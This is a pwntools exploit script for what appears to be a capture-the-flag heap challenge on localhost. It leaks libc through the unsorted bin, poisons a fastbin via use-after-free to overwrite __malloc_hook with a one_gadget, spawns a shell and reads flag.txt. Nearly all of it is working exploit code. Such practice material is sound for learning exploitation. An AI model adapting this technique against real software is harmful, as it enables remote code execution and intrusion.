from pwn import *

#p = process("./a.out")
p = remote("localhost",1337)
context.terminal = ['terminator','-e']

#gdbscript = """
#    b * add
#    b *_write
#    set resolve-heap-via-heuristic on
#"""
#pid = gdb.attach(p,gdbscript)

def add(idx,size):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"idx: \n",str(idx))
    p.sendlineafter(b"size: \n",str(size))

def delete(idx):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"idx: \n",str(idx))

def write(idx,contents):
    p.sendlineafter(b"> ",b"3")
    p.sendlineafter(b"idx: \n",str(idx))
    p.sendafter(b"contents: \n",contents)

def view(idx):
    p.sendlineafter(b"> ",b"4")
    p.sendlineafter(b"idx: \n",str(idx))
    p.recvuntil(b"data: ")
    return u64(p.recv(6).ljust(8,b'\x00'))



# Part 1: leak libc


add(0,0x80) #leak
add(1,0x10) #no consolidate
delete(0) # get main_arena+68
leak = view(0) 
libc_base = leak -0x3c4b78
one_gadget = libc_base +0xf03a4
__malloc_hook = libc_base + 0x3c4b10 - 0x30-0xb +0x20-0x8
puts = libc_base +0x6f6a0
print("lib_base: ",hex(libc_base))
print("one_gadget: ",hex(one_gadget))
print("__malloc_hook: ",hex(__malloc_hook))

add(2,0x80) #empty unsorted

# Part 2: fast bin poison

add(10,0x60) #victim
delete(10) # UAF
write(10,p64(__malloc_hook)) #poison

add(11,0x60) #pull idx 10
add(12,0x60) # pull malloc_hook
write(12,b"A"*19+p64(one_gadget)) #write one_gadget on malloc_hook
p.sendlineafter(b"> ",b"1")
p.sendlineafter(b"idx: \n",b"13")
p.sendlineafter(b"size: \n",p64(0)*(0x100//8)) # write null bytes on stack cuz libc 23 sucks

p.sendline(b"cat flag.txt")
print(p.recvline())

p.interactive()


